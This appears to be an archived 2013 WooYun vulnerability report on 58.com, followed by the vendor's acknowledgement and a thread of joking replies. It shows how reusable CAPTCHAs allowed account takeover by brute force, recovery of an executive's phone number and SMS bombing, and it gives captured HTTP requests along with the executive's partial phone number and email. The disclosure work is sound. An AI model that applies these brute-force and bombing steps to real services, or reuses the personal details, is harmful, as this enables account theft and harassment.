{"id": 8300, "wybug_id": "wooyun-2013-038329", "wybug_title": "58同城某处鸡肋设计缺陷的三种猥琐利用~", "wybug_corp": "58同城", "wybug_author": "niliu", "wybug_date": "2013-09-27 12:18", "wybug_open_date": "2013-11-11 12:19", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-11：\t细节向公众公开  简要描述： #鸡肋烤的好了吃着也香~#对之前提交的一个没有通过的鸡肋设计缺陷的三种猥琐利用~#~1可修改他人账号密码并成功登陆~#~2可获取58内部领导手机号~#~3对获取的58内部领导手机号进行短信轰炸~ 详细说明：  利用之前一个小缺陷可实现以下3个方面的利用#~1可修改他人账号密码并成功登陆~#~2可获取58内部领导手机号~#~3对获取的58内部领导手机号进行短信轰炸~---------------------------------------------------------------------问题描述：验证码没有限制有效次数，可多次使用#~1可修改他人账号密码并成功登陆~登陆页面验证码无使用次数限制可暴力破解他人账号首先以用户admin密码123456正常登陆几次，因为前几次登陆是没有验证码的，所以等弹出验证码后再登陆，登陆时抓包\n\n\nPOST /dounionlogin HTTP/1.1Host: passport.58.comProxy-Connection: keep-aliveContent-Length: 556Cache-Control: max-age=0Origin: http://passport.58.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Maxthon/4.0.3.6000 Chrome/22.0.1229.79 Safari/537.1Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8DNT: 1Referer: http://passport.58.com/login?path=http%3A%2F%2Fmy.58.com%2Fmyseekjob%2F1Accept-Encoding: gzip,deflateAccept-Language: zh-CNAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: @#￥…&%*%…#￥%isweak=1&path=http%3A%2F%2Fmy.58.com%2Fmyseekjob%2F1%3Fpts%3D1380250216822&p1=81258169aec0e3c8bef5475baf3cb569&p2=662512780135bf0052f54e50140d8790&p3=81c7f75b45073d4e50c808255cfe48a244f7596a079ac943da4bdeadeb55efed7f7ee1ab4ebfeac9e6d8b834d2d7ccc2f16ab5ec3c4399416573963999eb7d212daf58024b346fc05101221973e354525894a5f4088e61446b9b7866be6aab6a7ee0012713a11c2d1e452fe13434b9064b2a1f94a18dbc65d90c43a66afebd31&timesign=1380250281659&ptk=ffe232eb18464856839b4b5c42a2e438&cd=1864&username=admin&password=password&validatecode=de22q&mcresult=48484849485349505453\n然后以密码不变，对用户名参数username进行破解\n\n根据测试得知返回包长度为628的可登陆成功shi：123456 登陆时会跳转到一个更改密码的页面\n\n旧密码就是123456，虽然需要填写手机接收验证码但是填写自己的可以成功接收并更改密码。登陆截图用户shi\n\n用户简历\n\n用户 xie\n\n用户密码都被修改了，你说能干什么呢？---------------------------------------------------------------------#~2可获取58内部领导手机号~找回密码页面验证码同样的问题，可根据邮箱找回密码获取用户手机号码这里就对姚劲波的邮箱做个测试\nhttp://passport.58.com/forgetpassword\n填写好邮箱yaojb@58.com验证码提交\n\n来到验证页面根据提示可得知前7位手机号为13910**后四位暂时写1111，提交时抓包\n\n\nGET /forgetbymobile?mobile=13910**§1111§&validatecode=HDSZN HTTP/1.1Host: passport.58.comProxy-Connection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Maxthon/4.0.3.6000 Chrome/22.0.1229.79 Safari/537.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8DNT: 1Referer: http://passport.58.com/resetbymobileAccept-Encoding: gzip,deflateAccept-Language: zh-CNAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: #@##￥……&#￥\n对手机号参数mobile的后四位1111进行破解\n\n根据返回包才长度可得知手机号后四位为70**这样就得到了姚劲波的手机号，当然不限于他的手机号，这里就不再做其他证明了。---------------------------------------------------------------------#~3对获取的58内部领导手机号进行短信轰炸~得到手机号了有什么用处呢？继续猥琐，手机号进行一次短信轰炸，当然这里掩饰就拿自己手机号测试~利用之前的方法获取到真实手机号后，填写好，点发送确认码时抓包\nGET /forgetbymobile?mobile=186******04&validatecode=pakpe HTTP/1.1Host: passport.58.comConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Maxthon/4.0.3.6000 Chrome/22.0.1229.79 Safari/537.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8DNT: 1Referer: https://passport.58.com/resetbymobileAccept-Encoding: gzip,deflateAccept-Language: zh-CNAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: @#￥%\n这里前端虽然做了短信验证码接受时间限制，但是通过抓包发包可绕过限制进行短信轰炸~拿自己手机测试截图\n\n姚总日理万机我就不骚扰他了~   漏洞证明：  综上所述~   修复方案：  对验证码有效使用次数做限制~顺便求个58的小礼物吧~:D   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-09-27 14:35 厂商回复： 感谢对58的关注和支持！我们会尽快修复处理！晚些时候会索要联系方式，礼品是必须的！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-27 12:24 |    \t\t360安全卫士 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 360安全卫士就是好)\t\t \n  化腐朽为神奇    \n     2013-09-27 12:26 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @360安全卫士 化鸡肋为鸡腿~    \n     2013-09-27 12:30 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @niliu 化鸡腿为全鸡    \n     2013-09-27 12:33 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @寂寞的瘦子 化全鸡为鸡群    \n     2013-09-27 12:42 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @疯狗 化鸡群为鸡厂    \n     2013-09-27 12:47 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  @小川 化鸡场为鸡蛋    \n     2013-09-27 13:05 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @小威 化鸡蛋为蛋壳    \n     2013-09-27 13:54 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @niliu 化蛋壳为腐朽    \n     2013-09-27 13:54 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @niliu 化蛋壳为鸡肋    \n     2013-09-27 14:10 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @Mas 话鸡肋为牛排    \n     2013-09-27 14:11 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @D＆G 跨目录跨的太牛逼了    \n     2013-09-27 14:14 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  @D＆G 化牛排为牛群    \n     2013-09-27 17:05 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  @Master 化牛群为wb    \n     2013-09-27 17:10 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @围剿 化wb为qb    \n     2013-09-27 17:18 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @niliu 化q币为妹子    \n     2013-09-27 17:20 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  @niliu 化qb为nb    \n     2013-09-27 18:14 |    \t\tiiiiiiiii \t\t\t( 普通白帽子  |\t\t\t        Rank:680 漏洞数:89        | )\t\t \n  @ppt 化NB为神奇    \n     2013-10-10 08:00 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @58同城 放鸽子么    \n     2013-10-10 09:07 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @niliu 不会58会积攒一定能量后，然后一波发出去    \n     2013-10-10 09:21 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @小川 金滴么~ 赶紧爆发吧58    \n     2013-10-16 14:27 |    \t\t58同城(乌云厂商)\t\t \n  @niliu ^_^  58是有节操的公司，请放心！！礼物应该收到了吧？希望继续关注58安全，感谢！    \n     2013-10-16 14:55 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @58同城 恩恩，收到了~~ 58同城，一个有节操的网站~~~     \n     2013-10-27 15:20 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  礼物。。。    \n     2013-10-27 16:24 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @niliu 啥东西？    \n     2013-10-27 19:23 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @px1624 恐龙妹    \n     2013-10-27 20:45 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @niliu 公仔？    \n     2013-10-27 21:37 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @px1624 嗯哪，公仔~    \n     2013-11-04 17:18 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  mark,这个洞子告诉我们，鸡助不能丢    \n     2013-11-11 12:20 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  化鸡巴为鸡蛋    \n     2013-11-14 16:03 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  说好的烤鸡肋呢    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}